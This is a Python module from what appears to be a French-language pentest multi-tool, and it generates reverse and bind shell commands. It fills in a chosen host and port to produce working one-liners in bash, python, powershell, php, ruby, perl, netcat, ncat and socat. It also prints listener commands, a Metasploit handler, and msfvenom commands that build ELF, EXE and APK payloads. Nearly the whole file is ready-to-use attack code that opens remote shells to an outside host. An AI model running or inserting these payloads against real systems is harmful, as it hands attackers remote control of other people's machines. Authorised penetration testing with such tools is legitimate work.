"""Module 56 — Shell-Generator : payloads reverse/bind pour pentest (generation de commandes)."""
from .. import ui


def build_payloads(host, port, kind="reverse"):
    """Retourne {label: commande} avec host/port substitues.

    kind : "reverse" (defaut), "bind" ou "both".
    """
    reverse = {
        "bash-dev-tcp": f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
        "bash-123": f"0<>/dev/tcp/{host}/{port};cat <&0 | /bin/sh >&0 2>&0",
        "python3": (
            f"python3 -c 'import socket,os,pty as p;s=socket.socket();"
            f"s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p.spawn(\"/bin/bash\")'"
        ),
        "python-pty": (
            f"python -c 'import socket,os,pty;s=socket.socket();"
            f"s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        ),
        "powershell": (
            f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{host}',{port});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1 | Out-String);"
            f"$r2=$r+'PS '+(pwd).Path+'> ';"
            f"$sb=[Text.Encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\""
        ),
        "php": (
            f"php -r '$s=fsockopen(\"{host}\",{port});"
            f"while(!feof($s)){{fwrite($s,shell_exec(fgets($s)));}}'"
        ),
        "ruby": (
            f"ruby -rsocket -e 'c=TCPSocket.new(\"{host}\",\"{port}\");"
            f"while cmd=c.gets;begin;io=IO.popen(cmd,\"r\");c.write io.read;"
            f"io.close;rescue;c.write \"err\\n\";end;end'"
        ),
        "perl": (
            f"perl -e 'use Socket;$i=\"{host}\";$p={port};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");}}'"
        ),
        "nc-e": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
        "ncat": f"ncat {host} {port} -e /bin/bash",
        "socat": f"socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:{host}:{port}",
    }
    bind = {
        "bash-bind": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l -p {port} >/tmp/f",
        "nc-bind": f"nc -l -p {port} -e /bin/bash",
        "python-bind": (
            f"python3 -c 'import socket,os,pty as p;s=socket.socket();"
            f"s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
            f"s.bind((\"0.0.0.0\",{port}));s.listen(1);c,_=s.accept();"
            f"os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
            f"p.spawn(\"/bin/bash\")'"
        ),
    }
    if kind == "bind":
        return dict(bind)
    if kind == "both":
        merged = dict(reverse)
        merged.update(bind)
        return merged
    return dict(reverse)


def shell_generator():
    ui.module_header(56, "Shell-Generator", "Commandes reverse/bind shell multi-plateformes pour pentest autorise")
    ui.note("Generation de commandes uniquement : a utiliser la ou vous avez l'ecrit de l'administrateur.")

    kind_label = ui.ask_choice("Type", ["Reverse", "Bind", "Les deux"], default="Reverse")
    kind = {"Reverse": "reverse", "Bind": "bind", "Les deux": "both"}[kind_label]
    host = ui.ask_required("LHOST (IP ou domaine d'ecoute)")
    port = ui.ask_int("LPORT", default=4444, minimum=1, maximum=65535)

    payloads = build_payloads(host, port, kind)
    print()
    ui.info(f"{len(payloads)} commande(s) generee(s) :")
    print()
    for label, command in payloads.items():
        print("  " + ui.paint(f"[{label}]", ui.R, ui.K))
        print("  " + ui.paint("    " + command, ui.W))
        print()

    ui.info("Listeners :")
    listeners = [
        f"nc -lvnp {port}",
        f"ncat -lvnp {port}",
        f"socat file:`tty`,raw,echo=0 tcp-listen:{port}",
    ]
    for line in listeners:
        print("  " + ui.paint(line, ui.Y))
    print()
    print("  " + ui.paint("msfconsole (reverse) :", ui.R, ui.K))
    handler = (
        "msfconsole -q -x \"use exploit/multi/handler; "
        f"set payload linux/x64/shell_reverse_tcp; set LHOST {host}; "
        f'set LPORT {port}; run -j"'
    )
    print("  " + ui.paint("    " + handler, ui.W))
    print()

    ui.info("Reference msfvenom (payloads pre-compile, hors tool) :")
    msf = [
        f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={host} LPORT={port} -f elf -o shell.elf",
        f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o shell.exe",
        f"msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f raw -o shell.apk",
    ]
    for line in msf:
        print("  " + ui.paint("    " + line, ui.X))
    print()

    if ui.confirm("Sauvegarder les payloads ?", default=False):
        lines = [f"# FCK MULTI TOOL — Shell-Generator ({kind}, {host}:{port})", ""]
        for label, command in payloads.items():
            lines.append(f"# {label}")
            lines.append(command)
            lines.append("")
        ui.save_output("shell_payloads", "\n".join(lines))
